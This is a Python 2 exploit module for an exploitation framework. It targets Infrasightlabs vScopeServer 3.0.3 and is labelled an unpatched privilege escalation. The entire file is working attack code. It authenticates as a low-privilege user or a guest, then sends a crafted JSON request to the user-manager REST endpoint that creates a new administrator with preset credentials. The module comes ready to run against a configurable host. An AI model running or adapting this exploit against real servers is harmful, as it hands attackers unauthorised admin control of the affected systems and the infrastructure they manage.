#!/usr/bin/env python
import urllib2
import json
from urllib2 import HTTPError
import cookielib
from collections import OrderedDict
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_infrasightlabs_vscopeserver_privilege_escalation"
INFO['DESCRIPTION'] = "Infrasightlabs vScopeServer Privilege Escalation"
INFO['VENDOR'] = "https://www.infrasightlabs.com/"
INFO["CVE Name"] = "0day"
INFO["NOTES"] = """
Vulnerability allows authorized user or guest(if allowed) to create new admin user.
Tested against vScopeServer 3.0.3 on Windows 7 x64 SP1.
"""
INFO["DOWNLOAD_LINK"] = "https://www.infrasightlabs.com/download"
INFO["LINKS"] = []
INFO['CHANGELOG']="27 Sep, 2017"
INFO['PATH'] = "Web/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 80
OPTIONS["IS GUEST ALLOWED"] = False
OPTIONS["USERNAME"] = 'user', dict(description="Not requires if guest user allowed")
OPTIONS["PASSWORD"] = 'password', dict(description="Not requires if guest user allowed")
OPTIONS["NEW ADMIN USERNAME"] = "admin123"
OPTIONS["NEW ADMIN PASSWORD"] = "admin123"


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.payload = ""

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.is_guest_allowed = self.args.get("IS GUEST ALLOWED", OPTIONS["IS GUEST ALLOWED"])
        self.username = self.args.get("USERNAME", OPTIONS["USERNAME"])
        self.password = self.args.get("PASSWORD", OPTIONS["PASSWORD"])
        self.new_username = self.args.get("NEW ADMIN USERNAME", OPTIONS["NEW ADMIN USERNAME"])
        self.new_password = self.args.get("NEW ADMIN PASSWORD", OPTIONS["NEW ADMIN PASSWORD"])
        self.opener = None

    def make_url(self, path=''):
        proto = 'http'
        url = '{}://{}:{}/'.format(proto, self.host, self.port) + path
        return url

    def login(self):
        self.log('[*] Trying to login using %s:%s' % (self.username, self.password))
        url = self.make_url('rest/usermanager/authenticate')
        data = '{"usernameOrEmail":"%s","password":"%s"}' % (self.username, self.password)
        try:
            self.opener.open(url, data)
        except HTTPError as e:
            self.log(e)
            self.finish(False)
        self.log('[+] User %s successfully authorized' % self.username)

    def run(self):
        #Get options from gui
        self.args()
        cookie = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
        test_url = self.make_url('')
        opener.open(test_url).read()
        self.opener = opener
        if not self.is_guest_allowed:
            self.login()
        self.log('[*] Trying to create new admin')
        url = self.make_url('rest/usermanager/users?emailUser=false&groupIds=vscope-users,vscope-admins')
        data = '{"username":"%s","firstName":"Administrator","lastName":"Admin",' \
               '"enabled":true,"deletable":true,"isNew":true,"email":"%s", "password": "%s"}' % \
               (self.new_username, self.random_string() + '@admin.aaa', self.new_password)
        try:
            req = urllib2.Request(url, data=data, headers={"Content-Type": "application/json;charset=UTF-8"})
            resp = self.opener.open(req, data).read()
        except HTTPError as e:
            self.log(e)
            self.finish(False)
        self.log('[+] New administrator has been created with:\r\nusername:%s\r\npassword:%s' % (self.new_username, self.new_password))
        self.finish(True)



if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()